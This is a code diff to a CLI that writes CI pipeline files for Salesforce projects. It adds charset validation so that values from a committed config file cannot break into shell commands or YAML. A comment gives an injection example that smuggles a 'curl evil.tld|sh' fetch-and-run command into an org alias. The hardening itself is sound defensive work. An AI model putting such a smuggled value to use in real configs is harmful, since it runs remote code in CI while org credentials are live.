@@ -25,6 +25,67 @@ import {
 } from '../lib/ci-capabilities.js';
 import { detectLwcTests } from '../lib/lwc-test.js';
 
+/**
+ * Values that land in a shell command or a bare YAML scalar in the pipeline we
+ * write out. `interpolate()` is a plain regex replace with no escaping, and
+ * several of these default from `.sfdt/config.json` — which is committed, so it
+ * arrives with whatever repository was cloned.
+ *
+ * The damage is not local: the generated file is committed and pushed by the
+ * victim, and then runs in CI **after** the auth step, with `SFDX_AUTH_URL` or
+ * JWT material live in the job. `"defaultOrg": "prod$(curl evil.tld|sh)"`
+ * reaches `--org prod$(curl evil.tld|sh)` in a `run:` line.
+ *
+ * These are all identifiers, git refs, paths and versions — never free text — so
+ * they are *validated* rather than escaped. Escaping would have to be correct
+ * for two grammars at once (YAML and the shell inside it, which differ per
+ * provider); a charset rule does not.
+ *
+ * `org` reuses the alias rule the bridge contract already enforces
+ * (`ORG_ALIAS_RE` in packages/flow-core/src/bridge-contract.ts) so the CLI and
+ * the bridge cannot disagree about what a valid alias is.
+ */
+const TEMPLATE_VALUE_RULES = {
+  org: { re: /^[A-Za-z0-9@][A-Za-z0-9_.\-@]*$/, max: 80, what: 'an org alias', flag: '--org', key: 'defaultOrg' },
+  branch: { re: /^[A-Za-z0-9][A-Za-z0-9._/-]*$/, max: 255, what: 'a git branch name', flag: '--branch', key: 'defaultBranch' },
+  deltaBase: { re: /^[A-Za-z0-9][A-Za-z0-9._/~^-]*$/, max: 255, what: 'a git ref', flag: '--delta-base' },
+  environment: { re: /^[A-Za-z0-9][A-Za-z0-9._ -]*$/, max: 255, what: 'an environment name', flag: '--environment', key: 'ci.environment' },
+  scratchDef: { re: /^[A-Za-z0-9][A-Za-z0-9._/-]*$/, max: 255, what: 'a file path', flag: '--definition-file', key: 'scratch.definitionFile' },
+  nodeVersion: { re: /^[0-9]+(\.[0-9]+)*$/, max: 20, what: 'a Node version', flag: '--node' },
+  cron: { re: /^[-0-9*/, \t]+$/, max: 100, what: 'a cron expression', flag: '--cron' },
+};
+
+/**
+ * Refuse to generate a pipeline from a value that would break out of its
+ * position in the file. Throws with the offending key, the value, and where it
+ * most likely came from.
+ *
+ * @param {Record<string, unknown>} vars Interpolation values.
+ */
+export function assertSafeTemplateValues(vars) {
+  for (const [key, rule] of Object.entries(TEMPLATE_VALUE_RULES)) {
+    const raw = vars[key];
+    if (raw == null) continue;
+    const value = String(raw);
+    const bad =
+      value.length > rule.max ||
+      !rule.re.test(value) ||
+      // A path rule permits `/`, so `..` has to be excluded separately.
+      (rule.what === 'a file path' && value.split('/').includes('..'));
+    if (bad) {
+      const source = rule.key
+        ? `Set it with ${rule.flag}, or fix \`${rule.key}\` in .sfdt/config.json.`
+        : `Set it with ${rule.flag}.`;
+      throw new Error(
+        `Refusing to generate a CI pipeline: "${key}" is not ${rule.what}.\n` +
+          `  value: ${JSON.stringify(value)}\n` +
+          `This value is written into a shell command in the generated file, which then runs in CI ` +
+          `with your org credentials, so it is restricted to a safe character set.\n  ${source}`,
+      );
+    }
+  }
+}
+
 // CI templates ship inside the package — resolve from the module location, never
 // from the user's CWD (the package-internal path rule, golden principle #8).
 const __filename = fileURLToPath(import.meta.url);
@@ -146,7 +207,7 @@ export async function generateCi(options) {
     template = injectBlock(template, 'lwcTestSteps', lwcSteps);
   }
 
-  const content = interpolate(template, {
+  const vars = {
     cron: options.cron || '0 6 * * *',
     org,
     nodeVersion,
@@ -160,7 +221,10 @@ export async function generateCi(options) {
     authMethod: auth,
     // Scratch templates authenticate the Dev Hub, everything else a target org.
     setDefaultFlag: type === 'scratch' ? '--set-default-dev-hub' : '--set-default',
-  });
+  };
+
+  assertSafeTemplateValues(vars);
+  const content = interpolate(template, vars);
 
   return { provider, type, auth, runner, content, orgMissing, org };
 }
